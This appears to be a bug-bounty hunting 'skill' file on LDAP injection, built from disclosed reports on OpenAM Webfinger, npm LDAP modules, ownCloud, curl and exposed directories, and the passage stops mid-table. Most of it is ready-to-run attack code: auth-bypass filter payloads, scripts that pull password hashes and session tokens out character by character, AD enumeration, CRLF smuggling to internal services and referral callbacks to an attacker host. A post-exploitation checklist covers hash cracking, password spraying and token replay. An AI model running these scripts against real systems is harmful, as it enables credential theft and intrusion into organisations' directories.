---
name: hunt-ldap-injection
description: "Hunting skill for LDAP Injection built from 15 full disclosed bug-bounty reports (ForgeRock OpenAM Webfinger CVE-2021-29156 char-by-char hash theft, cloudron-surfer & meemo-app npm filter-injection DoS, ownCloud LDAP-password CRLF protocol smuggling, curl LDAP referral credential leak + LDIF line injection + BER assert crash, DoD/State Dept anonymous NULL-bind directory exposure, Acronis leaked LDAP creds on GitHub, Nextcloud user-filter & password-logging bugs). Covers search-filter context vs DN injection, RFC 4515 special chars (* ( ) \\ NUL /), parenthesis-balanced always-true filters, blind boolean/paired-control attribute exfiltration, AD vs generic LDAP (unicodePwd write-only vs readable userPassword hashes), XPath injection, referral/OOB confirmation, and CRLF protocol smuggling. Use when the target uses LDAP/AD auth, corporate SSO, a people-search/address-book API, a Webfinger/OIDC discovery endpoint, an admin-configurable LDAP password field, a libcurl/LDAP URL consumer, or an exposed directory port 389/636."
sources: hackerone_public, owasp, portswigger, curl_oss_fuzz, npm_advisories
report_count: 15
full_reports_read: 15
---

# HUNT-LDAP-INJECTION — LDAP Injection, Directory Exposure & Protocol Smuggling

> Grounding note: 15 public disclosed reports were read in full. Every citation in
> this skill is a real report ID from that study pack — no IDs or URLs are invented.
> Technique depth (filter grammar, oracle discipline, AD-vs-generic discipline) is
> supplemented from the domain reference (OWASP WSTG-INPV-06, PortSwigger Web
> Security Academy, RFC 4515). LDAP injection is frequently reported as DoS, info
> disclosure, or credential exposure rather than textbook "auth bypass" — hunt all
> of those shapes, not just the classic `)(uid=*)` login bypass.

### Severity quick reference

| Finding shape | Typical severity | Representative report |
|---------------|------------------|------------------------|
| Webfinger char-by-char hash / session token / private key theft | Critical | [#1278050], [#1278891] |
| Auth bypass landing as admin/privileged entry | Critical | technique from domain reference |
| Blind attr exfil / description-field plaintext credential read | High | technique from domain reference |
| CRLF protocol smuggling → internal SMTP/Redis/RCE | High–Critical | [#1054282] |
| Unescaped-filter DoS / filter-mutation error | Low–Critical (as rated) | [#906959], [#907311] |
| Referral-chasing credential leak | Medium | [#3756699] |
| Anonymous directory read / AD user+group enumeration | Medium–High | [#1937235], [#2081332], [#1869184] |
| LDIF line injection / BER parser crash | Low | [#4023506], [#3258022] |
| Credentials in logs / public repo | Low–Medium, scope-dependent | [#264426], [#1004412] |

---

## Crown Jewel Targets

LDAP injection that yields an **authentication bypass or char-by-char hash/session-token theft is Critical**; blind attribute exfiltration is High; anonymous directory read and AD enumeration are Medium-High; unauthenticated LDAP URL reachable on `389/636` is a real (if common) disclosure/DoS finding.

Highest-value primitives seen in the 15 reports:

- **Webfinger / OIDC discovery endpoints** — ForgeRock OpenAM pre-13.5.1 (CVE-2021-29156) allowed unauthenticated char-by-char retrieval of password hashes, session tokens, and private keys through the Webfinger protocol ([#1278050], [#1278891]). This is the single highest-signal target class in the pack.
- **Login forms whose filter is built by string concatenation** — the npm modules `cloudron-surfer` ([#906959]) and `meemo-app` ([#907311]) concatenated `username` directly into `(|(uid=...)(mail=...)(username=...)(sAMAccountName=...))`; the payload `*)(cn=*)(cn=*` mutated the filter, producing filter errors and DoS/Critical-severity findings.
- **Admin-configurable "LDAP password" fields** — ownCloud's `user_ldap` plugin ([#1054282]) let an admin (or stolen admin session) smuggle `\r\n` into the LDAP password to speak SMTP/Redis/Postgres/memcached on internal plaintext ports → arbitrary mail and potential RCE.
- **libcurl / LDAP URL consumers** — curl had three distinct LDAP bugs in the pack: attacker-controlled **referral chasing** leaking WinLDAP logon credentials to a second server ([#3756699]), **LDIF line injection** because DN/attribute names were written without RFC 2849 base64 encoding ([#4023506]), and a **BER assertion crash** from a malformed LDAP reply ([#3258022]).
- **Anonymous / NULL-bind directories** — DoD and State Dept hosts exposed full directory reads to anonymous LDAP ([#1937235], [#2081332], [#1869184]); nmap `ldap*` scripts and `ldap3` sort-request controls enumerate users, org structure, and metadata.
- **Registration forms and self-service pages** — DoD registration flow ([#359290]) fatal-errored (`0x80005000`) on a double-quote first name, confirming unsanitized input reaching an LDAP store.
- **Source/credential leakage** — Acronis leaked `LDAP_ADMIN_USER`/`LDAP_ADMIN_PASSWORD` in a public GitHub `.env.testing` ([#1004412]); Nextcloud logged LDAP passwords to disk when the server was unavailable ([#264426]).

Priority when scoring: **auth bypass / hash or token theft (Critical) > blind attribute or description-field credential read (High) > anonymous directory read + AD user/group enumeration (Medium-High) > filter-error DoS / crash (Low-Medium)**.

### Fastest wins (ranked by effort-to-severity)

1. **Webfinger present?** Check the version and run the prefix 200/404 probe — highest severity, unauthenticated, minutes to confirm.
2. **Login form + error strings?** Lone-paren syntax-error tell, then the always-true payload — decisive if it returns a real session.
3. **Port 389/636 reachable?** Anonymous bind with `ldapsearch` — instant directory read.
4. **Public source available?** Grep for `ldapClient.search` / `LDAP_ADMIN_PASSWORD` — two Criticals and one cred leak in this pack came from this step alone.
5. **Admin LDAP settings field present?** CRLF smuggling — high impact but needs admin/stolen session.

---

## Attack Surface Signals

### Endpoint & parameter patterns
```
# Auth / SSO / directory
/login  /signin  /api/login  /api/auth  /auth/ldap
/.well-known/webfinger?resource=            <-- CVE-2021-29156 class
/.well-known/openid-configuration
/api/ldap/*  /api/directory/*  /directory/search
/people  /address-book  /org-chart  /search?dir=  /users?q=
/Registration/Home/New  (self-registration writing to a directory)
/admin/settings/ldap  /admin/ldap  (admin-configurable bind DN / password fields)

# Input fields that commonly reach a filter
username=  user=  uid=  email=  mail=  sAMAccountName=
filter=  search=  q=  query=  resource=  principal=
first_name=  lastName=  cn=  displayName=  (registration attributes)
```

### Backend-confirming error strings (grep responses for these)
```
javax.naming.NameNotFoundException
javax.naming.directory.InvalidSearchFilterException
com.sun.jndi.ldap.*            (Java JNDI)
LDAP: error code 49 - 80090308 (AD invalid credentials / bind failure)
Error 0x80005000               (ADSI / LDAP — see DoD #359290)
"Bad search filter" / "Invalid syntax"
net.ldap / go-ldap             (Go)
python-ldap SERVER_DOWN / ldap.SIZELIMIT_EXCEEDED
System.DirectoryServices       (.NET)
ldap_search(): ...             (PHP)
```

### Tech-stack signals
- **Windows + IIS + integrated auth**, legacy Java/Spring/PHP corporate intranets — classic LDAP backends.
- **ForgeRock OpenAM / OpenIdentity** with Webfinger → check version < 13.5.1 immediately.
- **Node.js apps using `ldapjs`** with `ldapClient.search(base, { filter: '...' + userInput ... })` — the npm reports are verbatim examples.
- **Nextcloud / ownCloud with `user_ldap`** — user-filter bypass and password-field CRLF smuggling both disclosed.
- **curl or any libcurl-based LDAP URL fetcher** — referral chasing, LDIF injection, BER crash.
- **Ports 389 (LDAP) / 636 (LDAPS) exposed** — anonymous NULL-bind exposure; `ldap://` URLs accepted by import/fetch features.
- **XML-backed auth stores** — XPath injection candidate (`' or '1'='1`), no LDAP server needed.

### Positive-identification workflow (confirm LDAP before payloads)

```bash
# 1. Transport-level fingerprint — cheap, high-signal.
nmap -n -sV --script "ldap* and not brute" -p 389,636 $TARGET
#    Look for: "ldap-search" info, namingContexts, anonymous bind allowed.

# 2. Anonymous read test (DoD/State Dept pattern).
ldapsearch -x -H ldap://$TARGET:389 -b "" -s base namingContexts 2>&1
ldapsearch -x -H ldap://$TARGET:389 -b "dc=corp,dc=local" \
  "(&(objectClass=user)(sAMAccountName=*))" sAMAccountName memberOf 2>&1 | head -40

# 3. Error-string probe: send ')', '(', '*', '"', 'admin*' and grep the response for
#    jndi|NameNotFound|InvalidSearchFilter|error code 49|0x80005000|Bad search filter|ldap.
# 4. Version beacon: GET /.well-known/webfinger and /.well-known/openid-configuration.
```

### Which exploit shape fits? (decision tree)

- Does `/.well-known/webfinger` (or OIDC discovery) exist and return different codes for
  existing vs non-existing principals? → **Boolean oracle → char-by-char exfil** (Phase 3,
  Webfinger variant). Highest priority.
- Do login/registration fields reflect filter errors on `(`, `)`, `"`? → **Search-filter
  injection** (Phases 1–2) or **registration-write injection** ([#359290]).
- Is there an admin LDAP password / host / URL field? → **CRLF protocol smuggling** or
  **referral chasing** (Phase 6).
- Is port 389/636 exposed with anonymous bind? → **Directory read / enumeration** (Phase 4
  + nmap/ldapsearch).
- Is the target a libcurl/LDAP URL consumer or an import feature? → **BER crash / LDIF
  injection / referral** (Phase 6, [#3258022]/[#4023506]/[#3756699]).
- Is auth XML-backed (no LDAP server)? → **XPath injection** (Phase 5).

---

## Discovery Patterns From 15 Full Reports

### Where Researchers Start (ranked recon surfaces, with "what to look for")

1. **Public-code / JS source review** (signal count 5: `public-code-search`, `js-source-review` = 7 combined) — *what to look for:* filter strings assembled with `+`/template literals that interpolate `username`/`identifier` directly. Both npm DoS reports ([#906959], [#907311]) were found by reading published GitHub source, not by black-box fuzzing. The Acronis creds ([#1004412]) came from a public GitHub `.env.testing`. **Grep GitHub for `ldapClient.search`, `filter: '(|(uid='`, `LDAP_ADMIN_PASSWORD`, `CLOUDRON_LDAP_URL`.**

2. **Login/authentication flows** (`search-filter-sort` appears in 9 of 15 reports, the dominant signal) — *what to look for:* any form/API where username and password are sent to a server that "checks a directory." Inject `*`, `(`, `)`, `"`, NUL and watch for filter-syntax errors or changed session behavior. "The problem arises during the login phase" ([#906959]); registration fatal-error on `"` ([#359290]).

3. **SSO / OAuth / Webfinger / OIDC discovery** (`sso-oauth` = 4, `session-attack` = 5) — *what to look for:* `/.well-known/webfinger?resource=` and similar discovery endpoints that look up a user principal and return a boolean/status oracle. CVE-2021-29156 ([#1278050]/[#1278891]) turned 200-vs-404 into char-by-char hash and session-token recovery. **Also check Nextcloud's user-filter bypass ([#205908]): can a valid account outside the configured filter still log in?**

4. **Exposed directory ports / subdomains** (`port-scanning` = 3, `subdomain` = 1, `admin-internal` = 7) — *what to look for:* `nmap -n -Pn --script "ldap* and not brute" -p 389 <host>` and anonymous `ldapsearch`/`ldap3` binds. State Dept found `certrep.pki.state.gov:389` ([#1869184]); DoD hosts ([#1937235], [#2081332]) allowed anonymous reads.

5. **Admin settings surfaces that accept a bind DN / password / URL** (`proxy-feature` = 3, `cache-layer`/`cookie-handling`/`misconfiguration`) — *what to look for:* a field that later opens a network connection using its raw value. ownCloud's LDAP password field ([#1054282]) with `\r\n` became protocol smuggling; a libcurl-style LDAP URL field becomes referral chasing ([#3756699]).

6. **Import / file-upload / image-processing features** (`import-feature` = 4, `image-processing` = 6, `internal-network` = 6) — *what to look for:* features that fetch a URL or parse a structured file; an `ldap://` scheme or an attacker-chosen LDAP host can trigger libcurl's referral and BER bugs ([#3258022], [#3756699], [#4023506]).

7. **Client-side rendered / SSR apps** (`server-side-rendering` = 3, `template-engine`/`template-injection` = 4 combined) — *what to look for:* server-side template/JS contexts where user input is embedded into an LDAP query or a rendered error.

8. **Secret hygiene surfaces** (`public-code-search`, `stored`) — *what to look for:* public repos, config files, and log sinks holding bind DNs/passwords. Acronis leaked them in GitHub ([#1004412]); Nextcloud wrote them to logs on server failure ([#264426]). These are quick, low-effort reports even when no live port is reachable.

### Recon tooling & search queries (what researchers actually ran)

```bash
# Public-code search (GitHub/GitLab/code search engines)
ldapClient.search    # Node.js ldapjs filter construction
LDAP_ADMIN_PASSWORD  # leaked bind credentials
CLOUDRON_LDAP_URL    # npm module LDAP config
javax.naming.directory / webfinger   # JNDI call sites / discovery endpoints

# Host/network recon
nmap -n -Pn -sV --script "ldap* and not brute" -p 389,636 <host/subnet>
ldapsearch -x -H ldap://<host> -b "" -s base namingContexts
python3 -c "from ldap3 import Server,Connection; ..."   # sort-request controls (#2081332)
# Version checks: OpenAM < 13.5.1 -> CVE-2021-29156; curl 8.21 lib/ldap.c -> referral (#3756699)
```

**Why this ranking:** `search-filter-sort` (9 reports) and `admin-internal` (7) dominate —
most findings come from a web-facing filter or an admin-controlled config reaching a
privileged backend. Start there; port scanning and secret hygiene are cheaper, lower-severity.

### Feature-Based Discovery Signals (frequency-ranked, from the 15-report frequency table)

| Rank | Signal (reports) | Why it matters / what to probe |
|------|------------------|--------------------------------|
| 1 | `search-filter-sort` (9) | The filter itself is the injection sink. Probe `*)(cn=*)(cn=*` for filter mutation/DoS; a lone `)` for syntax error; `admin)(!(userPassword=ZZZ))` for always-true. |
| 2 | `admin-internal` (7) | Admin-only directory/ LDAP settings reach a privileged backend. Probe admin LDAP password/URL fields for CRLF, referrals, unvalidated hosts. |
| 3 | `image-processing` (6) | Server-side image/file processors often invoke libcurl or fetch URLs. Probe `ldap://` URLs and malformed BER replies for crashes/referral leaks. |
| 4 | `internal-network` (6) | LDAP often lives on an internal segment; injected filters or referrals pivot there. Probe referral targets and CRLF-suggled SMTP/Redis. |
| 5 | `public-code-search` (5) | Source leakage reveals exact filter construction and creds. Probe GitHub/GitLab for `ldapClient.search`, `LDAP_ADMIN_PASSWORD`. |
| 5 | `session-attack` (5) | Webfinger/user lookups leak session-token material via boolean oracle. Probe char-by-char extraction on token/hash attributes. |
| 7 | `import-feature` (4) | Import paths parse untrusted input into directory writes. Probe registration attributes (`"` → fatal error, #359290) and LDAP URL imports. |
| 7 | `sso-oauth` (4) | SSO/Webfinger endpoints are unauthenticated oracles. Probe `resource=` with filter metacharacters; check OpenAM version. |
| 9 | `port-scanning` (3) | Cheap confirmation of exposed directory. Probe 389/636 with nmap `ldap*` scripts and anonymous bind. |
| 9 | `server-side-rendering` (3) | SSR renders LDAP-derived error content back to you. Probe reflected filter errors and template fragments. |
| 9 | `proxy-feature` (3) | Proxy/fetch layers chase LDAP referrals. Probe first-hop LDAP server you control returning a referral to your listener. |
| 12 | `js-source-review` (2) | JS/Node filter concat is directly readable. Probe `filter:` template literals for missing escaping. |
| 12 | `api-endpoint` (2) | JSON-body login/search APIs carry the tainted field. Probe `username`/`filter` in JSON POST bodies. |
| 12 | `filter-bypass` (2) | WAF/allowlist around the filter can be escaped. Probe double-quote, NUL, and unbalanced-paren variants. |
| 12 | `blind-oob` (2) | Blind cases need OOB. Probe LDAP referral dereference to a Collaborator host (gold-standard confirmation). |
| 12 | `template-injection` (2) | Templates feeding LDAP queries or rendering errors. Probe template fragments with filter metacharacters. |
| 12 | `dependency-confusion` (2) | Vulnerable npm LDAP modules published publicly. Probe package versions against advisories. |
| 12 | `dos-resource` (2) | Filter injection often manifests as DoS/crash. Probe payloads that expand filter cost or assert-fail a BER parser. |
| 12 | `template-engine` (2) | Engine-side string building before LDAP call. Probe the pre-LDAP transformation for escaping gaps. |
| 20 | `auth-bypass`, `json-body`, `boolean-based`, `nosql-mass-assignment`, `fuzzing-enumeration`, `base64-encoding`, `cookie-handling`, `cache-layer`, `misconfiguration`, `cloud-metadata`, `comment-injection`, `xml-parser`, `stored`, `subdomain` (1 each) | Specialized entry points: always-true filter, JSON transport, true/false oracle, mass-assigned filter field, oss-fuzz crash, base64-wrapped DN in LDIF, stolen admin cookie, caching of bind result, wrong ACLs, referral chasing cloud metadata, comment syntax in filters, XML store (XPath), stored directory values, subdomain discovery. Probe the one that matches your target's stack. |

### Verbatim Discovery Clues

All quotes below are verbatim from the disclosed report text (redactions `██` preserved as in the source). These are the researchers' own "how I found it" / root-cause lines — treat them as a map of where this bug class actually surfaces.

- [#906959] "The problem arises during the login phase." — the entire cloudron-surfer finding started at the login form.
- [#906959] "For example, if the attacker provides the following payload `*)(cn=*)(cn=*`, this will result in the following filter:" — the exact filter-mutation payload that produced the DoS.
- [#906959] "var filter = `(|(uid=${username})(mail=${username})(username=${username})(sAMAccountName=${username}))`; //<-- INJECTION: username is not sanitized" — textbook concatenation sink.
- [#1004412] "Although I was not able to find any port open on the ███████ server, if the credentials are valid they can be used by insider threats for lateral movement and privilege escalation." — leaked creds still reported even without a reachable port.
- [#1004412] "The file hosted at https://github.com/mlanin/go/blob/[...]/.env.testing contains the following information: LDAP_DOMAIN=███ LDAP_BASE_DN=███ LDAP_ADMIN_USER=███████ LDAP_ADMIN_PASSWORD=██████" — public-code credential discovery.
- [#359290] "An LDAP Injection has been found at the mentioned domain" — DoD report opener.
- [#359290] "While performing a user registration, is it possible to edit the request and inject invalid characters, resulting in a LDAP injection" — registration (not just login) is a sink.
- [#359290] "Start a new registration process and use a double quote as first name" / "You will get a fatal error" / "Error `0x80005000` is specific of LDAP, this means that the application is trying to handle user data without sanitizing it" — the double-quote → fatal error signature.
- [#205908] "1 (centos7, installed from rpms) and I was able to log in with a test account which does not match the user filter." — Nextcloud user-filter bypass.
- [#205908] "We have set up a ldap user filter to match only those users in our ldap directory which should get access to nextcloud." — the expected behavior that was violated.
- [#1278050] "ForgeRock OpenAM before 13.5.1 allows LDAP injection via the Webfinger protocol. For example, an unauthenticated attacker can perform character-by-character retrieval of password hashes, or retrieve a session token or a private key." — the highest-impact line in the pack.
- [#1278891] "Username starting with ██████████ exists: https://█████████/███/███████[200 OK]" / "Username starting with ███████ doesn't exist: [...][404 Not Found]" — the literal 200/404 boolean oracle used for char-by-char extraction.
- [#1937235] "The remote LDAP server allows anonymous access" / "run $ `nmap -n -sV --script \"ldap* and not brute\" -p 389 ██████████`" — NULL-bind discovery recipe.
- [#2081332] "The host ██████████ has anonymous LDAP login enabled, which means that anyone can connect to the LDAP server without providing any authentication credentials." — anonymous read impact statement.
- [#1869184] "I have found that this subdomain certrep.pki.state.gov Is vulnerable LDAP Anonymous access enabled as you can see in the following screenshots:-" — subdomain-based LDAP discovery.
- [#1054282] "LDAP password field can be exploited with newline chars (\\r\\n) in order to communicate with protocols like SMTP, Redis and, generally speaking, with all services those speak plain text protocols (e.g. postgres, memcached, etc.)." — protocol-smuggling root cause.
- [#1054282] "When setting LDAP password is mandatory to intercept the request with a web proxy to get rid of URL encoding performed by Owncloud." — practical encoding-avoidance tip.
- [#3258022] "curl can crash when accessing an LDAP URL." / "curl: result.c:930: try_read1msg: Assertion `!BER_BVISEMPTY( &resoid )' failed." — oss-fuzz-style BER parser crash.
- [#3756699] "curl's generic LDAP backend (`lib/ldap.c`) does not disable automatic LDAP referral chasing [...] a malicious first-hop LDAP server can return a referral to an attacker-controlled second LDAP server" — referral-based credential leak.
- [#4023506] "curl 8.22.0 base64-encodes LDAP attribute values that aren't RFC 2849 SAFE-STRINGs [...], but the entry DN and the attribute names are still written to the LDIF output verbatim." — LDIF line-injection root cause.
- [#264426] "When the ldap server is (temporarily) unavailable, data like the attached ends up in log files." — password-to-log leak trigger.

### Probe Checklist (15 concrete probes)

Run these in order; each maps to a report pattern above. Capture a baseline response first (status, body length, timing, headers).

1. **Lone parenthesis** — send `username=test)` and `username=test(`. A filter-syntax error/500 vs identical baseline = unescaped filter input (Phase 1 tell).
2. **Wildcard value** — `username=*` in the login field. Always-true match or changed result count = filter wildcard reachable.
3. **Filter-mutation DoS payload** — `username=*)(cn=*)(cn=*` (verbatim from [#906959]). Filter expansion/error = Critical/DoS shape.
4. **Classic always-true bypass** — `username=*)(uid=*))(|(uid=*` with any password; balance parens against the app's appended clause; confirm a real session, not just a different error page.
5. **Double quote** — `first_name="` on any registration/self-service field (verbatim from [#359290]); watch for fatal error `0x80005000`.
6. **NUL truncation** — `username=admin)(uid=*))%00` in C-backed/JNDI stacks; password clause should be dropped.
7. **Boolean-oracle pair** — known-TRUE `admin)(uid=*))(|(uid=*` vs known-FALSE `admin)(uid=NONEXIST_ZZZ))(|(uid=NONEXIST_ZZZ`; if responses differ, you have an exfil oracle.
8. **Webfinger char extraction** — `/.well-known/webfinger?resource=` + prefix + `*` and watch 200/404 (CVE-2021-29156, [#1278050]/[#1278891]).
9. **User-filter bypass** — log in with a valid directory account that should be excluded by the configured LDAP filter ([#205908]).
10. **Anonymous NULL bind** — `ldapsearch -x -H ldap://host:389 -b "dc=..." "(&(objectClass=user)(sAMAccountName=*))"` and nmap `ldap*` scripts ([#1937235], [#2081332], [#1869184]).
11. **Admin LDAP password CRLF** — in an admin LDAP settings field, inject `%0D%0A` + SMTP/Redis commands (intercept to strip URL encoding first, per [#1054282]); only with admin rights/stolen session.
12. **LDAP referral OOB** — point a first-hop LDAP server you control at a second-hop referral to your Collaborator; any DNS/LDAP hit = server-side proof ([#3756699] class).
13. **`ldap://` URL fetch** — feed `ldap://YOURHOST/` to any URL-consuming/import feature; watch for crashes (BER assert, [#3258022]) or second-hop connections.
14. **XPath injection** — on XML-backed auth, `' or '1'='1`, `admin' or '1'='1' or 'a'='b`, `x'] | //user/* | //user[name()='x`; keep quotes/brackets balanced (XPath has no comment syntax).
15. **Source/credential recon** — GitHub/GitLab search for `LDAP_ADMIN_PASSWORD`, `CLOUDRON_LDAP_URL`, `ldapClient.search`; test any found creds against live hosts ([#1004412]).

### Probe priorities & false-positive guards

- Probes **1–4** are the core auth-bypass chain; a difference from baseline is a *lead*, not
  a finding — confirm with a real session (Phase 2) and a negative control (Gate 0).
- Probes **5–6** prove unsanitized input reaches the store, not exploitable injection.
- Probe **7** is the pivot from "error" to "exfiltration": no oracle, no blind extraction.
- Probes **8–9** are SSO logic bugs that need no metacharacters at all.
- Probes **10–13** need a reachable service or admin foothold — confirm scope first.
- Probe **14** is XPath (a different grammar); probe **15** is passive recon.

Never interpret a WAF block as a "match" — WAF pages change length/status like a real
injection. Every probe is defined relative to a captured baseline and a control pair.

---

## Step-by-Step Hunting Methodology

### Phase 0 — Establish the backend and a clean baseline
```bash
# Capture a control response for EVERY comparison that follows.
BASE=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}|%{time_total}" \
  -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"validlookinguser","password":"wrongpass"}')
echo "BASELINE (valid-format, wrong pw): $BASE"
```
Also fingerprint the stack from error strings in the Attack Surface Signals list. If Webfinger is present, check the OpenAM version before doing anything else.

### Phase 0b — Fingerprint the directory product (decides which payloads apply)

```bash
# Product identification changes the game: AD has no readable hash attribute,
# OpenLDAP/389-DS may expose userPassword; ForgeRock has a known CVE.
curl -s "https://$TARGET/.well-known/webfinger?resource=acct:nobody@$TARGET" -i | head -20
curl -s "https://$TARGET/.well-known/openid-configuration" | grep -iE 'issuer|openam|version'

# Error strings that name the stack
#   javax.naming.* / com.sun.jndi.ldap  -> Java JNDI, generic or AD backend
#   LDAP: error code 49 - 80090308       -> Active Directory
#   0x80005000                           -> ADSI / AD (see #359290)
#   System.DirectoryServices             -> .NET / AD
#   net.ldap / python-ldap               -> Go / Python generic LDAP
```

Record the product in your notes: it determines whether you chase `userPassword` hashes
(generic only) or `description`/`info` + `memberOf` (AD), and whether a version-specific CVE
(Webfinger/OpenAM, curl, npm module) applies.

### Phase 1 — Confirm an injectable filter (syntax-error tell)
```bash
# A lone ')' that errors while the balanced baseline does not is the cleanest tell.
for P in 'test)' 'test(' 'test*' '*' '"'; do
  R=$(curl -s -w "|%{http_code}|%{size_download}" -X POST https://$TARGET/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$P\",\"password\":\"x\"}")
  echo "PAYLOAD [$P] -> ${R: -40}   (baseline $BASE)"
done
# grep response for: naming|InvalidSearchFilter|error code 49|0x80005000|Bad search filter|jndi
```
A lone `)` producing a 500/filter error while a balanced payload does not = the filter parsed and executed. Save this as proof.

### Phase 2 — Auth-bypass payloads (balance your parentheses)
```bash
# Assumed filter: (&(uid=USERNAME)(userPassword=PASSWORD))
USERNAME_PAYLOADS=(
  'admin*'                              # wildcard suffix, lowest noise — try first
  '*)(uid=*))(|(uid=*'                  # classic self-balancing always-true
  'admin)(!(userPassword=ZZZ))'         # AND NOT a never-set password → always true
  'admin))(|(uid=*'
  'admin)(uid=*))%00'                   # NUL-truncate the password clause (C-backed)
)
for P in "${USERNAME_PAYLOADS[@]}"; do
  R=$(curl -s -w "|%{http_code}|%{size_download}" -X POST https://$TARGET/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$P\",\"password\":\"anything\"}")
  echo "PAYLOAD: $P  ->  ${R: -40}   (baseline $BASE)"
done
```
Parenthesis rule: count `(` minus `)` in the **resulting full filter**, not just your payload. If the app appends `)(userPassword=...))` after your input, leave the right number of trailing `)` so the final string is balanced. Unbalanced = syntax error = NOT a bypass.

### Phase 3 — Blind exfil with a PAIRED control (not raw byte-count)
```bash
# Establish a TRUE-class and FALSE-class oracle on a public attribute.
probe () { curl -s -o /dev/null -w "%{size_download}" -X POST https://$TARGET/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$1\",\"password\":\"x\"}"; }
T=$(probe 'admin)(uid=*))(|(uid=*')
F=$(probe 'admin)(uid=NONEXIST_ZZZ))(|(uid=NONEXIST_ZZZ')
echo "TRUE-class=$T  FALSE-class=$F"
[ "$T" = "$F" ] && { echo "No length oracle — try STATUS / body-marker / timing / OOB."; exit; }

# Char-by-char extraction against the paired control (NON-AD userPassword example).
PREFIX=""
for pos in $(seq 1 32); do
  for C in {a..z} {A..Z} {0..9} '$' '/' '.' '+' '=' '{' '}'; do
    S=$(probe "admin)(userPassword=${PREFIX}${C}*))(|(uid=*")
    if [ "$S" = "$T" ]; then PREFIX="${PREFIX}${C}"; echo "[$pos] -> $PREFIX"; break; fi
  done
  # Confirm the FALSE control still reads FALSE (a WAF block looks like a match).
  [ "$(probe 'admin)(uid=NONEXIST_ZZZ))(|(uid=NONEXIST_ZZZ')" != "$F" ] && echo "oracle drift — stop"
done
echo "RECOVERED: $PREFIX"
```
Guards: repeat each positive char 3× (length-jitter from the injected char is the #1 false positive); re-check the FALSE control each round; if body length is unreliable switch to HTTP status, a body-marker string, or timing — but only after establishing a stable delta. The Webfinger reports used exactly this pattern with 200 vs 404 as the oracle.

#### Webfinger / status-oracle variant (CVE-2021-29156 shape)

```bash
# Verbatim oracle from #1278891: prefix that exists -> 200; prefix that doesn't -> 404.
oracle_status () {  # $1 = attribute + prefix + char + '*'
  curl -s -o /dev/null -w "%{http_code}" \
    "https://$TARGET/.well-known/webfinger?resource=acct:$1@$TARGET"
}
# Establish the two classes first.
echo "known-user prefix: $(oracle_status 'administrator')"   # expect 200
echo "bogus prefix:      $(oracle_status 'zzqx_unlikely')"    # expect 404

# Extract a hash/token char-by-char (attribute name depends on the directory).
PREFIX=""
for pos in $(seq 1 40); do
  for C in {a..z} {A..Z} {0..9} '$' '/' '.' '+' '=' '{' '}'; do
    CODE=$(oracle_status "administrator*)(userPassword=${PREFIX}${C}*")
    if [ "$CODE" = "200" ]; then
      PREFIX="${PREFIX}${C}"; echo "[$pos] -> $PREFIX"; break
    fi
  done
done
echo "RECOVERED: $PREFIX"
```

The Webfinger exploit is notable because it is **unauthenticated** and the oracle is a clean
status code, not a noisy byte count — which is why it recovered hashes, session tokens, and
private keys in the disclosed reports.

### Phase 4 — AD enumeration via wildcard (count oracle)
```bash
count () { curl -s -X POST https://$TARGET/api/directory/search \
  -H "Content-Type: application/json" -d "{\"filter\":\"(sAMAccountName=$1*)\"}" \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get("results",d.get("users",[]))))' 2>/dev/null; }
CTRL=$(count "zzqx_unlikely"); echo "control count (≈0): $CTRL"
for L in {a..z}; do echo "$L* -> $(count $L)  (vs control $CTRL)"; done
# Pivot to privileged groups / admin-stored secrets:
#   (&(sAMAccountName=*)(memberOf=*Domain Admins*))
#   (description=*pw*)   (info=*pass*)   — admins stash plaintext creds here
```

### Phase 5 — XPath injection (XML-backed auth)
```bash
XPATH_PAYLOADS=(
  "' or '1'='1"
  "' or ''='"
  "admin' or '1'='1' or 'a'='b"
  "x'] | //user/* | //user[name()='x"   # blind node dump
  "*[contains(name(),'pass')]"           # node-name discovery
)
for P in "${XPATH_PAYLOADS[@]}"; do
  R=$(curl -s -w "|%{http_code}|%{size_download}" -X POST https://$TARGET/api/login \
    --data-urlencode "username=$P" --data-urlencode "password=x")
  echo "$P -> ${R: -24}"
done
# XPath has NO comment syntax — keep quotes/brackets balanced, unlike SQLi.
```

### Phase 6 — Protocol smuggling / referral / OOB (report-specific shapes)
```bash
# CRLF smuggling via an admin LDAP password field (ownCloud #1054282):
#   intercept request, strip URL encoding, inject %0D%0A + SMTP/Redis commands.

# Referral chasing (curl #3756699): stand up a first-hop LDAP server that returns
#   a referral to ldap://<COLLAB>/x, then point the target's LDAP URL consumer at it.
#   A DNS/LDAP interaction at Collaborator is decisive proof.

# Direct bind validation if you recover creds:
ldapsearch -x -H ldap://$AD_HOST -D "CORP\\user" -w "$PW" \
  -b "dc=corp,dc=local" "(&(objectClass=user)(sAMAccountName=admin*))" \
  sAMAccountName memberOf description

# Anonymous exposure check (DoD/State Dept pattern):
nmap -n -sV --script "ldap* and not brute" -p 389 $TARGET
ldapsearch -x -H ldap://$TARGET:389 -b "dc=corp,dc=local" "(objectClass=*)" 2>/dev/null | head
```

### Phase 7 — Document the exact shape and severity, then report
Record: the sink, the payload, the baseline vs injected response, the true/false controls, and the real-world impact (session, hash, token, internal service). Never report a "bypass" that is only a different error page.

### Post-exploitation chain checklist (once a primitive works)

- [ ] **Auth bypass achieved** → enumerate `memberOf`/`description` on the returned entry;
      look for admin groups and admin-stored plaintext credentials.
- [ ] **Hash recovered (non-AD)** → offline-crack `{SSHA}`/`{CRYPT}` and test reuse on
      SSO, VPN, and other internal services.
- [ ] **Session token recovered (Webfinger)** → replay it against the authenticated app
      and capture the account context (this is what makes the finding Critical).
- [ ] **Username list enumerated** → feed to password spray / credential stuffing on the
      same SSO perimeter.
- [ ] **CRLF smuggling confirmed** → map which internal plaintext services are
      reachable (SMTP, Redis, memcached, Postgres) and the RCE path each enables.
- [ ] **Referral/OOB confirmed** → treat as SSRF-class; map which internal LDAP hosts the
      client will re-bind to.
- [ ] **Anonymous bind confirmed** → dump the full DIT for org chart, emails, and
      mis-stored secrets in `description`/`info`.

---

## Payload & Detection Patterns

### The special-character set — test each one (RFC 4515 §3)
| Char | Escaped form | Why it matters |
|------|--------------|----------------|
| `*` | `\2a` | wildcard — matches any value |
| `(` | `\28` | opens a filter group |
| `)` | `\29` | closes a filter group |
